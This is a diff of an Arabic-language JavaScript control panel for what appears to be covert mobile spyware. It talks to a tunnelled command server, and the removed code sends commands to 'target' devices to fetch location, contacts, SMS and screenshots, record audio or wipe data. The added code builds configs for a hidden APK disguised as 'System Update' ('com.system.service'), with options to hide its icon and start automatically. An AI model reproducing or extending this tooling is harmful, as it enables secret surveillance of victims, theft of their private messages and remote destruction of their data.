@@ -1,526 +1,155 @@
-// ============================================
-// 🔧 إعدادات التطبيق
-// ============================================
+// controller-app/app.js - Control Panel v2.0
 
-const SERVER_URL = localStorage.getItem('SERVER_URL') || 'http://localhost:3000';
-const CHECK_IN_INTERVAL = 30000;
+const DEFAULT_SERVER_URL = 'https://assign-place-picture-recommendation.trycloudflare.com';
+let SERVER_URL = localStorage.getItem('SERVER_URL') || DEFAULT_SERVER_URL;
+let authToken = null;
+let selectedDeviceId = null;
 
-let currentUser = null;
-let devices = [];
-let logs = [];
-let selectedDevice = null;
-
-// ============================================
-// 🚀 تهيئة التطبيق
-// ============================================
-
-document.addEventListener('DOMContentLoaded', () => {
-    initializeApp();
-    loadSavedData();
-    setupEventListeners();
-});
-
-function initializeApp() {
-    console.log('🚀 Device Tracker Pro initialized');
-    checkAuth();
+function login() {
+    const username = document.getElementById('adminUsername')?.value;
+    const password = document.getElementById('adminPassword')?.value;
+    if (!username || !password) { alert('⚠️ أدخل بيانات الدخول'); return; }
+    authToken = btoa(`${username}:${password}`);
+    localStorage.setItem('authToken', authToken);
+    document.getElementById('loginSection').style.display = 'none';
+    document.getElementById('dashboardSection').style.display = 'block';
+    loadSettings(); refreshDevices();
 }
 
-function loadSavedData() {
-    const savedUser = localStorage.getItem('currentUser');
-    const savedLogs = localStorage.getItem('appLogs');
-    
-    if (savedUser) {
-        currentUser = JSON.parse(savedUser);
-    }
-    
-    if (savedLogs) {
-        logs = JSON.parse(savedLogs);
-        renderLogs();
-    }
-}
-
-function setupEventListeners() {
-    // زر تسجيل الدخول
-    document.getElementById('loginBtn')?.addEventListener('click', handleLogin);
-    
-    // Enter key في حقول التسجيل
-    document.getElementById('adminUsername')?.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleLogin();
-    });
-        document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') handleLogin();
-    });
-    
-    // Toggle الوضع الليلي
-    document.getElementById('darkModeToggle')?.addEventListener('change', toggleDarkMode);
-}
-
-// ============================================
-// 🔐 المصادقة
-// ============================================
-
-function checkAuth() {
-    if (currentUser) {
-        showDashboard();
-    } else {
-        showLogin();
-    }
-}
-
-function handleLogin() {
-    const username = document.getElementById('adminUsername').value;
-    const password = document.getElementById('adminPassword').value;
-    
-    if (!username || !password) {
-        showNotification('الرجاء إدخال اسم المستخدم وكلمة المرور', 'error');
-        return;
-    }
-    
-    // محاكاة تسجيل الدخول (في الإنتاج استخدم API حقيقي)
-    const btn = document.getElementById('loginBtn');
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحميل...';
-    btn.disabled = true;
-    
-    setTimeout(() => {
-        currentUser = { username, loginTime: new Date() };
-        localStorage.setItem('currentUser', JSON.stringify(currentUser));
-        
-        showNotification('تم تسجيل الدخول بنجاح', 'success');
-        showDashboard();
-        
-        btn.innerHTML = `
-            <span class="btn-text">تسجيل الدخول</span>
-            <span class="btn-icon"><i class="fas fa-arrow-left"></i></span>
-            <div class="btn-shine"></div>
-        `;
-        btn.disabled = false;
-    }, 1500);
-}
-function logout() {
-    if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
-        currentUser = null;
-        localStorage.removeItem('currentUser');
-        showLogin();
-        showNotification('تم تسجيل الخروج', 'success');
-        toggleSidebar();
-    }
-}
-
-// ============================================
-// 📱 إدارة الشاشات
-// ============================================
-
-function showLogin() {
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    document.getElementById('loginScreen').classList.add('active');
-}
-
-function showDashboard() {
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    document.getElementById('dashboardScreen').classList.add('active');
-    loadDevices();
-}
-
-function showSection(sectionId) {
-    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-    document.getElementById(sectionId + 'Section').classList.add('active');
-    
-    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-    event.currentTarget.classList.add('active');
-    
-    toggleSidebar();
-    
-    if (sectionId === 'devices') loadDevices();
-    if (sectionId === 'logs') renderLogs();
-}
-
-function toggleSidebar() {
-    document.getElementById('sidebar').classList.toggle('active');
-}
-
-function toggleProfileMenu() {
-    // يمكن إضافة قائمة منسدلة هنا
-    showNotification('ملف المستخدم', 'success');
-}
-
-// ============================================
-// 📊 إدارة الأجهزة
-// ============================================
-async function loadDevices() {
-    const grid = document.getElementById('devicesGrid');
-    grid.innerHTML = '<div class="loading"><i class="fas fa-spinner fa-spin"></i> جاري التحميل...</div>';
-    
+async function refreshDevices() {
     try {
-        const response = await fetch(`${SERVER_URL}/api/devices`);
+        const response = await fetch(`${SERVER_URL}/api/devices`, { headers: { 'Authorization': `Basic ${authToken}` } });
         const data = await response.json();
-        
-        if (data.success) {
-            devices = data.devices;
-            renderDevices();
-        } else {
-            throw new Error('فشل تحميل الأجهزة');
-        }
+        if (data.success) renderDevices(data.devices);
     } catch (error) {
-        console.error('خطأ في تحميل الأجهزة:', error);
-        grid.innerHTML = `
-            <div class="error-message">
-                <i class="fas fa-exclamation-triangle"></i>
-                <p>فشل تحميل الأجهزة</p>
-                <button onclick="loadDevices()">إعادة المحاولة</button>
-            </div>
-        `;
+        console.error('❌ Connection error:', error.message);
+        alert('❌ فشل الاتصال. تأكد من إعدادات الخادم.');
     }
 }
 
-function renderDevices() {
-    const grid = document.getElementById('devicesGrid');
-    
+function renderDevices(devices) {
+    const container = document.getElementById('devicesList');
+    if (!container) return;
     if (devices.length === 0) {
-        grid.innerHTML = `
-            <div class="no-devices">
-                <i class="fas fa-mobile-alt"></i>
-                <h3>لا توجد أجهزة متصلة</h3>
-                <p>قم بتثبيت التطبيق على الجهاز الهدف ليظهر هنا</p>
-            </div>
-        `;
+        container.innerHTML = '<p style="color:#888;text-align:center;padding:20px;">لا توجد أجهزة متصلة</p>';
         return;
     }
-    
-    grid.innerHTML = devices.map(device => `
-        <div class="device-card ${device.status === 'active' ? 'online' : 'offline'}" 
-             onclick="openDeviceModal('${device.deviceId}')">
-            <div class="device-header">
-                <div class="device-icon">
-                    <i class="fas fa-mobile-alt"></i>
-                </div>
-                <div class="device-info">
-                    <h3>${device.deviceInfo?.deviceName || 'جهاز غير معروف'}</h3>
-                    <p>${device.deviceId.substring(0, 12)}...</p>
-                </div>
-            </div>
-            
-            <div class="device-status ${device.status === 'active' ? 'online' : 'offline'}">
-                <span class="status-dot"></span>
-                <span>${device.status === 'active' ? 'متصل' : 'غير متصل'}</span>
-            </div>
-            
-            <div class="device-details">
-                <div class="detail-item">
-                    <span class="detail-label">آخر اتصال</span>
-                    <span class="detail-value">${formatDate(device.lastCheckIn)}</span>
-                </div>
-                <div class="detail-item">
-                    <span class="detail-label">مسجل منذ</span>
-                    <span class="detail-value">${formatDate(device.registeredAt)}</span>
-                </div>
-            </div>
-            
-            <div class="device-actions">
-                <button class="btn-device-action" onclick="event.stopPropagation(); sendQuickCommand('${device.deviceId}', 'get_location')">
-                    <i class="fas fa-map-marker-alt"></i>
-                    الموقع
-                </button>
-                <button class="btn-device-action" onclick="event.stopPropagation(); sendQuickCommand('${device.deviceId}', 'get_system_info')">
-                    <i class="fas fa-info-circle"></i>
-                    معلومات
-                </button>
-                <button class="btn-device-action danger" onclick="event.stopPropagation(); sendQuickCommand('${device.deviceId}', 'wipe_data')">
-                    <i class="fas fa-trash"></i>
-                    مسح
-                </button>
-            </div>
-        </div>
-    `).join('');
+    container.innerHTML = devices.map(device => {
+        const isOnline = device.isOnline || (device.lastCheckIn && (Date.now() - new Date(device.lastCheckIn).getTime()) < 60000);
+        return `
+            <div class="device-card ${selectedDeviceId === device.deviceId ? 'active' : ''}" onclick="selectDevice('${device.deviceId}', ${JSON.stringify(device).replace(/'/g, "\\'")})">
+                <h4>📱 ${device.deviceInfo?.deviceName || 'Unknown'}</h4>
+                <p><strong>ID:</strong> ${device.deviceId?.substring(0, 20)}...</p>
+                <p><strong>Client:</strong> ${device.clientId?.substring(0, 15)}...</p>
+                <p><strong>Config:</strong> ${device.config?.configId || 'default'}</p>
+                <p><strong>Registered:</strong> ${new Date(device.registeredAt).toLocaleString('ar-EG')}</p>
+                <span class="status ${isOnline ? 'online' : 'offline'}">${isOnline ? '🟢 متصل' : '🔴 غير متصل'}</span>
+            </div>`;
+    }).join('');
+}
+function selectDevice(deviceId, device) {
+    selectedDeviceId = deviceId;
+    document.getElementById('selectedDeviceId').textContent = deviceId?.substring(0, 25) + '...';
+    document.getElementById('deviceStatus').textContent = device.status || 'unknown';
+    document.getElementById('deviceLastCheckIn').textContent = device.lastCheckIn ? new Date(device.lastCheckIn).toLocaleString('ar-EG') : 'Never';
+    document.getElementById('deviceConfigId').textContent = device.config?.configId || 'default';
+    document.getElementById('deviceDetails').style.display = 'block';
+    document.querySelectorAll('.device-card').forEach(card => card.classList.remove('active'));
+    event?.closest('.device-card')?.classList.add('active');
 }
 
-function refreshDevices() {
-    showNotification('جاري تحديث الأجهزة...', 'success');
-    loadDevices();
+function toggleCustomAction() {
+    const commandType = document.getElementById('commandType')?.value;
+    const customInput = document.getElementById('customAction');
+    if (customInput) customInput.style.display = commandType === 'custom' ? 'block' : 'none';
 }
 
-// ============================================
-// 🎮 الأوامر المخصصة
-// ============================================
-
-function insertCommand(commandType) {
-    const textarea = document.getElementById('customCommand');
-    const commands = {        'get_location': `{
-  "type": "get_location",
-  "priority": "high"
-}`,
-        'get_system_info': `{
-  "type": "get_system_info",
-  "include": ["battery", "network", "storage"]
-}`,
-        'take_screenshot': `{
-  "type": "take_screenshot",
-  "quality": "high"
-}`,
-        'get_contacts': `{
-  "type": "get_contacts",
-  "limit": 100
-}`,
-        'get_sms': `{
-  "type": "get_sms",
-  "limit": 50
-}`,
-        'record_audio': `{
-  "type": "record_audio",
-  "duration": 30
-}`
-    };
-    
-    textarea.value = commands[commandType] || '';
-    textarea.focus();
-    showNotification('تم إدراج الأمر', 'success');
-}
-
-function clearCommand() {
-    document.getElementById('customCommand').value = '';
-    showNotification('تم مسح الأمر', 'success');
-}
-
-async function sendCustomCommand() {
-    const commandText = document.getElementById('customCommand').value;
-    
-    if (!commandText.trim()) {
-        showNotification('الرجاء كتابة أمر', 'error');
-        return;
-    }
-    
+async function sendCommand() {
+    if (!selectedDeviceId) { alert('⚠️ اختر جهاز أولاً'); return; }
+    const commandType = document.getElementById('commandType')?.value;
+    const customAction = document.getElementById('customAction')?.value;
+    const command = { type: commandType, action: commandType === 'custom' ? customAction : null, payload: {} };
     try {
-        const command = JSON.parse(commandText);
-        
-        if (!selectedDevice) {
-            showNotification('الرجاء اختيار جهاز أولاً', 'error');
-            return;        }
-        
-        await sendCommandToDevice(selectedDevice, command);
-        
-        // إضافة للسجل
-        addToCommandHistory(command);
-        
-        showNotification('تم إرسال الأمر بنجاح', 'success');
-        clearCommand();
-    } catch (error) {
-        showNotification('أمر غير صالح: ' + error.message, 'error');
-    }
+        const response = await fetch(`${SERVER_URL}/api/devices/${selectedDeviceId}/command`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${authToken}` },
+            body: JSON.stringify({ type: command.type, action: command.action, payload: command.payload })
+        });
+        const data = await response.json();
+        if (data.success) alert('✅ تم إرسال الأمر!'); else alert('❌ فشل: ' + data.error);
+    } catch (error) { alert('❌ خطأ اتصال: ' + error.message); }
 }
 
-function addToCommandHistory(command) {
-    const historyList = document.querySelector('.history-list');
-    const item = document.createElement('div');
-    item.className = 'history-item';
-    item.innerHTML = `
-        <div><strong>${command.type}</strong></div>
-        <div style="color: var(--text-muted); font-size: 12px;">${new Date().toLocaleTimeString('ar-SA')}</div>
-    `;
-    historyList.insertBefore(item, historyList.firstChild);
-}
-
-async function sendQuickCommand(deviceId, commandType) {
-    const command = { type: commandType };
-    await sendCommandToDevice(deviceId, command);
-    addLog(`أمر ${commandType} أُرسل للجهاز`, 'success', deviceId);
-}
-
-async function sendCommandToDevice(deviceId, command) {
+async function generateConfig() {
+    const serverUrl = document.getElementById('configServerUrl')?.value?.trim();
+    const appName = document.getElementById('configAppName')?.value || 'System Update';
+    const appId = document.getElementById('configAppId')?.value || 'com.system.service';
+    const checkInInterval = parseInt(document.getElementById('configCheckInInterval')?.value) || 30000;
+    const hideIcon = document.getElementById('configHideIcon')?.checked;
+    const autoStart = document.getElementById('configAutoStart')?.checked;
+    
+    if (!serverUrl) { alert('⚠️ أدخل رابط الخادم'); return; }
     try {
-        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
+        const response = await fetch(`${SERVER_URL}/api/config/generate`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                deviceId,
-                command: command
-            })
+            body: JSON.stringify({ serverUrl, appName, appId, checkInInterval, hideIcon, autoStart, customConfig: {} })
         });
-        
         const data = await response.json();
-        
-        if (data.success) {
-            addLog(`تم إرسال الأمر: ${command.type}`, 'success', deviceId);
-        } else {
-            throw new Error(data.error);
-        }
-    } catch (error) {        addLog(`فشل إرسال الأمر: ${error.message}`, 'error', deviceId);
-        showNotification('فشل إرسال الأمر', 'error');
+        if (data.success) {            document.getElementById('resultConfigId').textContent = data.configId;
+            document.getElementById('resultHtmlSnippet').textContent = data.htmlSnippet;
+            document.getElementById('configResult').style.display = 'block';
+            document.getElementById('configResult')?.scrollIntoView({ behavior: 'smooth' });
+        } else { alert('❌ فشل: ' + data.error); }
+    } catch (error) { alert('❌ خطأ اتصال: ' + error.message); }
+}
+
+function copyConfigCode() {
+    const code = document.getElementById('resultHtmlSnippet')?.textContent;
+    if (code) {
+        navigator.clipboard.writeText(code).then(() => alert('✅ تم النسخ! الصقه في hidden-apk/index.html')).catch(() => alert('⚠️ انسخ يدوياً'));
     }
 }
 
-// ============================================
-// 📋 السجلات
-// ============================================
-
-function addLog(message, type = 'info', deviceId = null) {
-    const log = {
-        message,
-        type,
-        deviceId,
-        timestamp: new Date().toISOString()
-    };
-    
-    logs.unshift(log);
-    if (logs.length > 100) logs.pop();
-    
-    localStorage.setItem('appLogs', JSON.stringify(logs));
-    renderLogs();
-}
-
-function renderLogs() {
-    const container = document.getElementById('logsContainer');
-    
-    if (logs.length === 0) {
-        container.innerHTML = `
-            <div class="log-empty">
-                <i class="fas fa-inbox"></i>
-                <p>لا توجد سجلات بعد</p>
-            </div>
-        `;
-        return;
-    }
-    
-    container.innerHTML = logs.map(log => `
-        <div class="log-item ${log.type}">
-            <div class="log-content">
-                <div class="log-message">${log.message}</div>
-                <div class="log-time">${formatDate(log.timestamp)}</div>
-            </div>
-            ${log.deviceId ? `<div class="log-device">${log.deviceId.substring(0, 8)}...</div>` : ''}
-        </div>
-    `).join('');
-}
-
-function clearAllLogs() {
-    if (confirm('هل أنت متأكد من مسح جميع السجلات؟')) {        logs = [];
-        localStorage.removeItem('appLogs');
-        renderLogs();
-        showNotification('تم مسح السجلات', 'success');
+function loadSettings() {
+    const savedUrl = localStorage.getItem('SERVER_URL');
+    if (savedUrl && document.getElementById('settingServerUrl')) {
+        document.getElementById('settingServerUrl').value = savedUrl;
+        SERVER_URL = savedUrl;
     }
 }
 
-// ============================================
-// 🗂️ النوافذ المنبثقة
-// ============================================
-
-function openDeviceModal(deviceId) {
-    selectedDevice = deviceId;
-    const device = devices.find(d => d.deviceId === deviceId);
-    
-    if (!device) return;
-    
-    const modalBody = document.getElementById('deviceModalBody');
-    modalBody.innerHTML = `
-        <div class="device-detail-grid">
-            <div class="detail-row">
-                <span class="detail-label">معرف الجهاز:</span>
-                <span class="detail-value">${device.deviceId}</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">اسم الجهاز:</span>
-                <span class="detail-value">${device.deviceInfo?.deviceName || 'غير معروف'}</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">الحالة:</span>
-                <span class="detail-value ${device.status === 'active' ? 'online' : 'offline'}">
-                    ${device.status === 'active' ? '✅ متصل' : '❌ غير متصل'}
-                </span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">آخر اتصال:</span>
-                <span class="detail-value">${formatDate(device.lastCheckIn)}</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">مسجل منذ:</span>
-                <span class="detail-value">${formatDate(device.registeredAt)}</span>
-            </div>
-        </div>
-    `;
-    
-    document.getElementById('deviceModal').classList.add('active');
+function saveSettings() {
+    const newUrl = document.getElementById('settingServerUrl')?.value?.trim();
+    if (!newUrl) { alert('⚠️ أدخل رابط الخادم'); return; }
+    localStorage.setItem('SERVER_URL', newUrl);
+    SERVER_URL = newUrl;
+    alert('✅ تم الحفظ!');
+    refreshDevices();
 }
 
-function closeDeviceModal() {
-    document.getElementById('deviceModal').classList.remove('active');    selectedDevice = null;
+async function testConnection() {
+    const statusEl = document.getElementById('connectionStatus');
+    if (!statusEl) return;
+    statusEl.textContent = '🔄 جاري الاختبار...'; statusEl.className = '';
+    try {
+        const response = await fetch(`${SERVER_URL}/`, { timeout: 5000 });
+        const data = await response.json();
+        if (data.success) { statusEl.textContent = '✅ الخادم يعمل!'; statusEl.className = 'success'; }
+        else { statusEl.textContent = '⚠️ الخادم رد بدون نجاح'; statusEl.className = 'error'; }
+    } catch (error) { statusEl.textContent = '❌ فشل: ' + error.message; statusEl.className = 'error'; }
 }
 
-function sendCommandToDevice(commandType) {
-    if (!selectedDevice) return;
-    sendQuickCommand(selectedDevice, commandType);
-    closeDeviceModal();
-}
-
-// ============================================
-// ⚙️ الإعدادات
-// ============================================
-
-function editServerUrl() {
-    const newUrl = prompt('أدخل رابط الخادم الجديد:', SERVER_URL);
-    if (newUrl) {
-        document.getElementById('serverUrlDisplay').textContent = newUrl;
-        showNotification('تم تحديث رابط الخادم', 'success');
+document.addEventListener('DOMContentLoaded', () => {
+    const savedToken = localStorage.getItem('authToken');
+    if (savedToken) {
+        authToken = savedToken;
+        document.getElementById('loginSection').style.display = 'none';
+        document.getElementById('dashboardSection').style.display = 'block';        loadSettings(); refreshDevices();
     }
-}
+    setInterval(() => {
+        if (authToken && document.getElementById('dashboardSection')?.style.display !== 'none') refreshDevices();
+    }, 30000);
+});
 
-function editCheckInInterval() {
-    const newInterval = prompt('أدخل فترة الاتصال بالثواني:', '30');
-    if (newInterval) {
-        showNotification('تم تحديث فترة الاتصال', 'success');
-    }
-}
-
-function toggleDarkMode() {
-    document.body.classList.toggle('dark-mode');
-    showNotification('تم تغيير الوضع', 'success');
-}
-
-// ============================================
-// 🔔 الإشعارات
-// ============================================
-
-function showNotification(message, type = 'info') {
-    const container = document.getElementById('notificationContainer');
-    const icons = {
-        success: 'fa-check-circle',
-        error: 'fa-exclamation-circle',
-        warning: 'fa-exclamation-triangle',
-        info: 'fa-info-circle'
-    };
-    
-    const notification = document.createElement('div');
-    notification.className = `notification ${type}`;
-    notification.innerHTML = `
-        <i class="fas ${icons[type]}"></i>        <span>${message}</span>
-    `;
-    
-    container.appendChild(notification);
-    
-    setTimeout(() => {
-        notification.remove();
-    }, 3000);
-}
-
-// ============================================
-// 📅 دوال مساعدة
-// ============================================
-
-function formatDate(dateString) {
-    if (!dateString) return '---';
-    const date = new Date(dateString);
-    return date.toLocaleString('ar-SA', {
-        year: 'numeric',
-        month: 'short',
-        day: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit'
-    });
-}
-
-// ============================================
-// 🔄 الاتصال الدوري
-// ============================================
-
-setInterval(async () => {
-    if (currentUser) {
-        await loadDevices();
-    }
-}, CHECK_IN_INTERVAL);
+console.log('🎮 Control Panel v2.0 | Server:', SERVER_URL);
